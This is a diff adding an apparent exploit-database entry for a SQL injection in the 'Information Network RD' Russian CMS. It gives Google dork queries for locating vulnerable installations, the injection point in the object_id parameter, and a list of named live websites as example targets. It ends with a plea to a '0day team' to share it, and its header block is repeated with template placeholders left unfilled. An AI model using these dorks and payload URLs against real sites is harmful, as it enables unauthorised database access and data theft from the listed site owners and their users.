@@ -1,0 +1,58 @@
+# Exploit Title: Information Network RD SQL INJECTION(Critical)[RUSSIAN]
+
+# Date: 22.06.2016
+
+# Exploit Author:No3ZeminKat
+
+# Vendor Homepage: http://eng.rdinfo.ru
+
+# Software Link: http://eng.rdinfo.ru(private software)
+
+# Version: [app version] (REQUIRED)
+
+# Tested on: Kali 2.0,Windows Xp,Windows 8
+
+# CVE : [if applicable]
+# Google Dork:
+
+dork1: inurl:"/object.php?mode=view&site_id="
+
+dork2: inurl:"/object.php?mode="
+
+OR ALL Sites List >>http://eng.rdinfo.ru/person.php?mode=view_site&site_id=784&own_menu_id=74544
+
+#Exploit Usage:
+
+www.target.com/object.php?mode=view&site_id=46&object_id=0''[Sql Injection]
+
+Example Sites:
+
+http://vestnikakv.ru/object.php?mode=view&site_id=46&object_id=0'
+
+http://www.tbash.ru/object.php?mode=view&site_id=795&object_id=0'
+
+http://graal-rus.ru/object.php?mode=view&site_id=37&object_id=0'
+
+http://rdinfo.ru/object.php?mode=view&site_id=37&object_id=0'
+
+http://marriageagency30.com/object.php?mode=view&site_id=795&object_id=0'
+
+http://indigo30.ru/object.php?mode=view&site_id=795&object_id=0'
+
+http://legko-stroit.ru/object.php?mode=view&site_id=37&object_id=0'
+
+Dear 0day team ,please share my vulnerability!!thankss
+
+# Date: 22.06.2016
+
+# Exploit Author:No3ZeminKat
+
+# Vendor Homepage: http://eng.rdinfo.ru
+
+# Software Link: http://eng.rdinfo.ru(private software)
+
+# Version: [app version] (REQUIRED)
+
+# Tested on: Kali 2.0,Windows Xp,Windows 8
+
+# CVE : [if applicable]
